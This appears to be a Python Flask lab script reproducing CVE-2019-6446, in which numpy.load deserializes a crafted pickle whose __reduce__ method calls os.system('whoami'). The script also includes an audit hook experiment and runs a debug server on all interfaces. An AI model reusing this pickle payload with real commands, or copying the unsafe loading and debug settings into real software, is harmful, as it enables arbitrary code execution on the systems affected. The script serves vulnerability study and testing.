# coding : utf-8
# CVE-2019-6446

from flask import Flask, request, render_template, redirect, url_for, session, flash
# from numpy.ma import core
from numpy import __version__
import numpy
print ("Numpy current version is: " + (__version__))

import os
import pickle

import sys

def hook(evt, arg):
    if evt in ["sys._getframe", "object.__getattr__", "object.__setattr__"]:
        return
    frame = sys._getframe(0)
    f = frame.f_code.co_filename
    
    while frame:
        if frame.f_back is None:
            break
        else:
            frame = frame.f_back
        
        func_name = frame.f_code.co_name
        if frame.f_code.co_filename == f:

            if func_name == "test":
                if evt not in ['open']:
                    raise RuntimeError('Event not allowed')

sys.addaudithook(hook)

class Test(object):
    def __init__(self):
        self.a = 1
    def __reduce__(self):
        return (os.system,('whoami',))

app=Flask(__name__)
@app.route('/')
def index():
    return "hello world"

@app.route('/test')
def test():
    tmpdaa = Test()
    with open("t.pickle",'wb') as f:
        pickle.dump(tmpdaa,f)
    numpy.load('t.pickle')
    return "hello test"

if __name__ == '__main__':
    app.run(host='0.0.0.0',port=5000,debug=True)